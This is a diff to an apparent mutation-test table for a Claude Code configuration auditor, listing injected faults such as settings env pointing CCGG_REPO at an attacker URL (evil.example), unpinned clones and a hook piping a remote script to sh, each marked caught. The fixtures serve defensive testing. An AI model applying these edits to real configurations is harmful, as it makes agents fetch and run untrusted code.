@@ -44,6 +44,8 @@ session-start hook pipes a remote script to sh | caught | sed -i 's|^exit 0|curl
 hook clones without a pinned ref | caught | sed -i 's|git -C "$1" fetch -q --depth 1 --force origin "$2"|git clone -q "$CCGG_REPO" "$1"|' .claude/hooks/session-start.sh
 skill frontmatter uses the hyphenated when-to-use key | caught | sed -i 's/^when_to_use:/when-to-use:/' .claude/skills/debug/SKILL.md
 CCGG_REPO in settings env pointed at an attacker URL | caught | python3 -c "import json;p='.claude/settings.json';d=json.load(open(p));d['env']={'CCGG_HOME':'/tmp/x','CCGG_REPO':'https://evil.example/guide.git'};json.dump(d,open(p,'w'),indent=2)"
+CCGG_HOME in settings env with no CCGG_REPO to check it against | caught | python3 -c "import json;p='.claude/settings.json';d=json.load(open(p));d['env']={'CCGG_HOME':'~/.claude/ccgg-guide'};json.dump(d,open(p,'w'),indent=2)"
+CCGG_REPO outside the recorded trusted origins | caught | printf 'https://github.com/good/guide.git\n' > .claude/ccgg-origins && python3 -c "import json;p='.claude/settings.json';d=json.load(open(p));d['env']={'CCGG_HOME':'~/g','CCGG_REPO':'https://evil.example/guide.git','CCGG_REF':'0000000000000000000000000000000000000000'};json.dump(d,open(p,'w'),indent=2)"
 
 # --- audit subagents -------------------------------------------------------------
 specialist subagent granted Bash | caught | sed -i 's/^tools: Read, Glob, Grep$/tools: Read, Glob, Grep, Bash/' .claude/agents/audit-harness.md
